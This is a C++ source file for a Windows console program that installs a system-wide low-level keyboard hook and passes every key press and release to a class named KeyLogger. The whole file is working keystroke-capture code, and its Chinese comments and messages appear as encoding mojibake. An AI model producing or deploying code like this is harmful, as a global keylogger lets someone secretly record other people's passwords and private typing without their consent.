// HookKbd.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "HookKbd.h"
#include <Windows.h>
#include <iostream>

using namespace std;
KeyLogger& keyLogger = KeyLogger::GetInstance();

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT*)lParam;
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
		BOOL bctrl = GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
		keyLogger.OnKeyDown(ks->vkCode);
	} else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
		keyLogger.OnKeyUp(ks->vkCode);
	}
	return CallNextHookEx(0, code, wParam, lParam);
}

int main()
{
	HHOOK keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, GetModuleHandleA(0), 0);
	if (keyboardHook == 0)
	{
		cout << "Hook����ʧ��" << endl;
		return -1;
	}
	cout << "�ɹ�Hook������Ϣ" << endl;

	MSG msg;
	while (GetMessageA(&msg, 0, 0, 0)){
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}

	UnhookWindowsHookEx(keyboardHook);

	cout << "���Hook,���򼴽��˳�" << endl;
	return 0;
}
